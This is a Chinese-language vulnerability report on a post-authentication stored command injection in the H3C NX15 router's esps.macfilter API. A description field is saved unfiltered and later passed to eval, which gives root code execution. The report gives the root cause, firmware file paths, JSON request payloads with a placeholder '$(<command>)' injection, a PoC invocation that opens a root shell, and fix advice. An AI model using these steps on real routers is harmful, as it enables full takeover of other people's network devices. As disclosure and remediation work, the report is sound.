# H3C NX15 R017 `esps.macfilter.add` 到 `getlist` 存储型 root RCE 报告

## 一、漏洞概述

H3C NX15 路由器 NX15V100R017 固件的 `/api/esps` 接口中，`esps.macfilter` 对象存在存储型命令执行漏洞。已认证管理员可通过 `add` 方法将恶意 `description` 字段写入配置，随后调用 `getlist` 方法读取列表时，后端脚本会对配置中的 `description` 执行 `eval`，最终以 root 权限执行攻击者命令。

该漏洞属于“写入阶段存储、读取阶段触发”的存储型 root RCE 链。

## 二、影响范围

- 厂商：H3C
- 产品：H3C NX15 路由器
- 影响版本：NX15V100R017 / R017
- 漏洞类型：存储型命令注入 / root 远程命令执行
- 认证要求：需要管理员 Web 会话
- 漏洞接口：`POST /api/esps`
- 漏洞对象：`esps.macfilter`
- 漏洞方法链：`add` -> `getlist`
- 注入字段：`description`

## 三、漏洞链路

完整利用链如下：

1. 攻击者登录 Web 管理后台并获取管理员会话。
2. 调用 `/api/esps` 中的：

   ```text
   object = esps.macfilter
   method = add
   ```

3. 在 `description` 字段写入包含 shell 命令替换的 payload。
4. 后端将恶意 `description` 保存到 UCI 配置。
5. 攻击者调用：

   ```text
   object = esps.macfilter
   method = getlist
   ```

6. 后端读取配置并执行 `eval`，触发存储的 payload。
7. 命令以 root 权限执行。

## 四、根因分析

### 1. 写入阶段缺少危险字符过滤

`add` 分支读取用户提交的 `description`：

```sh
json_get_var _description description
```

随后保存到配置：

```sh
uci set webrestriction.macbind_"${_id}".description="${description}"
```

该字段没有对 `$()`、反引号、shell 操作符等危险语法进行严格过滤，因此攻击者可把命令替换表达式原样写入配置。

### 2. 读取阶段对配置内容执行 `eval`

`getlist` 相关逻辑读取配置中的 `description` 后，使用 `eval` 赋值：

```sh
eval webrestriction_remark_list"${idx}"="$(uci get webrestriction."$1".description)"
```

如果配置中的 `description` 为：

```sh
$(<command>)
```

则命令会在 `eval` 阶段被 shell 解释执行。

### 3. 存储型触发特点

该漏洞不是一次请求中的即时命令注入，而是：

- 第一次请求负责写入恶意数据。
- 恶意数据持久化到配置。
- 第二次请求读取配置时触发命令执行。

因此该问题具备更强的隐蔽性和持久化风险。

## 五、固件内定位路径

以下路径均为相对于解压后固件根文件系统的固件内部路径，用于审计定位：

- `/www/api`：Web API 二进制，负责处理认证后的 `/api/esps` 请求并转发 ubus 对象调用。
- `/usr/libexec/rpcd/esps.macfilter`：漏洞后端脚本，`add` 分支写入 `description`，`getlist` 路径读取配置并执行 `eval`。
- `/etc/config/webrestriction`：MAC 过滤配置所在 UCI 文件，保存 `webrestriction.macbind_*` 规则和 `description` 字段。
- `/usr/sbin/uci`：后端脚本使用的 UCI 配置读写工具。

## 六、复现步骤

### 1. 登录获取管理员会话

通过 Web 登录接口获取管理员 session，并在后续请求中设置：

```text
AUTHENTICATION: <session>
```

### 2. 写入恶意 MAC 过滤规则

调用：

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "add",
    "param": {
      "mac": "02:AA:BB:CC:EE:01",
      "description": "$(<command>)"
    }
  }
]
```

实际验证中可使用启动临时 shell 服务的命令作为 payload。

### 3. 触发列表读取

调用：

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "getlist",
    "param": {}
  }
]
```

读取配置时触发 `eval`，执行前一步存储的 payload。

### 4. 使用附件 PoC 验证

```bash
python3 poc/15_postauth_esps_macfilter_getlist_rce.py \
  --base http://192.168.8.1 \
  --username admin \
  --password '<admin-password>' \
  --port 2323 \
  --cleanup
```

预期结果：

```text
uid=0(root)
```

## 七、验证结果

在 NX15V100R017 测试设备上，PoC 成功完成以下动作：

- 通过 `add` 写入恶意 `description`。
- 通过 `getlist` 触发后端 `eval`。
- 启动临时 root shell。
- 连接 shell 并执行 `id`，返回 `uid=0(root)`。

## 八、危害说明

该漏洞可造成：

- 已认证攻击者获得 root 权限。
- 恶意 payload 存储在设备配置中，后续读取列表时再次触发。
- 可用于植入持久化服务、篡改配置或完全接管路由设备。
- 如果配合其它未授权接管漏洞，攻击者可从未授权访问升级到 root 权限。

## 九、附件

- 报告：`report/17_postauth_esps_macfilter_getlist_rce_report.md`
- PoC：`poc/15_postauth_esps_macfilter_getlist_rce.py`

## 十、修复建议

- 禁止对配置读取结果执行 `eval`。
- 对 `description` 等可控字段执行严格字符白名单校验。
- 写入配置前拒绝 `$()`、反引号、分号、管道符、重定向符等 shell 元字符。
- 在读取配置时使用安全的数据结构和 JSON 输出，不应经过 shell 二次解释。
- 对 `/api/esps` 暴露对象和方法进行白名单限制。
